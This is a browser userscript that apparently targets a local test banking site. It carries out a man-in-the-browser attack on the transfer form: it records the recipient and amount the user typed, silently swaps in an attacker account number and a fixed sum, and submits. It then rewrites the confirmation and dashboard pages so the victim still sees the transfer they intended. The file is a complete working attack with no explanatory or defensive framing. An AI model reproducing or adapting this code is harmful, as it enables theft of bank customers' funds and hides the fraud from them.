// ==UserScript==
// @name     Banking
// @match    http://127.0.0.1/*
// @version  1
// @grant    none
// ==/UserScript==
var hackerAccount = "37211111110000000000000009";
let toSteal = "100";

if (
  window.location.pathname == "/new_transfer/" &&
  document.getElementById("confirm_transfer_form") != null
) {
  
  const form = document.getElementById("confirm_transfer_form");
  const recipientNameInput = document.getElementsByName("recipient_name")[0];
  const recipientAccountInput = document.getElementsByName("recipient_account")[0];
  const amountInput = document.getElementsByName("amount")[0];

  form.addEventListener("submit", event => {
    event.preventDefault();
    let hackerTransfers = JSON.parse(
      window.localStorage.getItem("hackerTransfers") || "[]"
    );
    hackerTransfers.push({
      "recipient_name": recipientNameInput.value,
      "recipient_account": recipientAccountInput.value,
      "amount": amountInput.value,
      "date": new Date().getTime()
    });
    window.localStorage.setItem(
      "hackerTransfers",
      JSON.stringify(hackerTransfers)
    );
    
    recipientNameInput.value = "hacker";
    recipientAccountInput.value = hackerAccount;
    amountInput.value = toSteal;
    form.submit();
  });
} else if (window.location.pathname == "/dashboard/"){
  
  const dashboardTransfers = getDashboardTransfers();
 
  const hackerTransfers = JSON.parse(
    window.localStorage.getItem("hackerTransfers") || "[]"
  ).sort(compare).reverse();

  for (dashboardTransfer of dashboardTransfers) {
    if (dashboardTransfer.recipient_name.innerText == "hacker") {
        dashboardTransfer.recipient_name.innerText = hackerTransfers[0].recipient_name;
        dashboardTransfer.number.innerText = hackerTransfers[0].recipient_account;
        dashboardTransfer.amount.innerText = hackerTransfers[0].amount;
      	hackerTransfers.shift();
    }
  }
} else if (window.location.pathname == "/new_transfer/confirmed") {

  let recipientName = document.getElementById("confirmed_name");
  let amount = document.getElementById("confirmed_amount");
  let account = document.getElementById("confirmed_account");
	
  const hackerTransfers = JSON.parse(
    window.localStorage.getItem("hackerTransfers")
  );
  
  const realData = hackerTransfers.sort(compare).at(-1)  //nearest by date
    
  if (recipientName.innerHTML.includes("hacker")){
      recipientName.innerHTML = realData.recipient_name;
  }
  if (account.innerHTML == hackerAccount) {
    account.innerHTML = realData.recipient_account
  }
  if (amount.innerHTML == toSteal) {
    amount.innerHTML = realData.amount
  }
 
}

function getDashboardTransfers() {
  const rows = document.querySelectorAll("#outgoing-table > tbody > tr");
  return Array.from(rows)
    .map(row => Array.from(row.children))
    .map(row => ({
      "number": row[0],
      "recipient_name": row[1],
      "amount": row[3],
    }));
}

function compare(a, b) {
    if (a.date < b.date)
       return -1
    if (a.date > b.date)
       return 1
    return 0
 }
 